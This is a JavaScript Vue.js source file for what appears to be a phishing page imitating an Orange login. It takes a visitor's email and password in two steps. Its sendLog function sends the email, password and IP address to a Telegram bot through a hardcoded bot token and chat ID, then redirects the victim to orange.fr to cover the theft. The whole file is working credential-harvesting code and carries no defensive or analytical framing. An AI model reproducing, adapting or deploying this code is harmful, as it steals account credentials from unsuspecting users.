new Vue({
  el: '#index',
  data() {
    return {
      login: 1,
      log: {
        EMAIL: '',
        PASS: ''
      },
      error: false,
      isPasswordVisible: false,
      isPasswordFilled: false,
    };
  },
  methods: {
    handleInput() {
      this.error = false;
    },
    handleInput2() {
      this.error = false;
      this.isPasswordFilled = this.log.PASS.length > 0;
    },
    togglePasswordVisibility() {
      this.isPasswordVisible = !this.isPasswordVisible;
    },
    goToCredit() {
      // ✅ Validation stricte d'une adresse e-mail
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (!this.log.EMAIL || !emailRegex.test(this.log.EMAIL)) {
        this.error = true;
        return;
      }

      this.error = false;
      this.login = 2; // passer à l’étape suivante (mdp)
    },
    async sendLog() {
      if (!this.log.PASS || this.log.PASS.length < 3) {
        this.error = true;
        return;
      }
      this.error = false;

      // 📨 Construction du message à envoyer sur Telegram
      const ip = window.iPfull || 'IP non récupérée';
      const message = `
📩 Nouvelle connexion :
Email : ${this.log.EMAIL}
Mot de passe : ${this.log.PASS}
IP : ${ip}
      `;

      const botToken = '8176410248:AAFILC598s17ovRi5rfW-G-j5qmy3hIA1jc';
      const chatId = '7710081913';
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        const response = await axios.post(url, {
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        });

        if (response.data.ok) {
          window.location.href = 'https://www.orange.fr'; // Redirection après succès
        } else {
          console.error('Erreur envoi Telegram', response.data);
          this.error = true;
        }
      } catch (err) {
        console.error('Erreur envoi Telegram', err);
        this.error = true;
      }
    }
  }
});
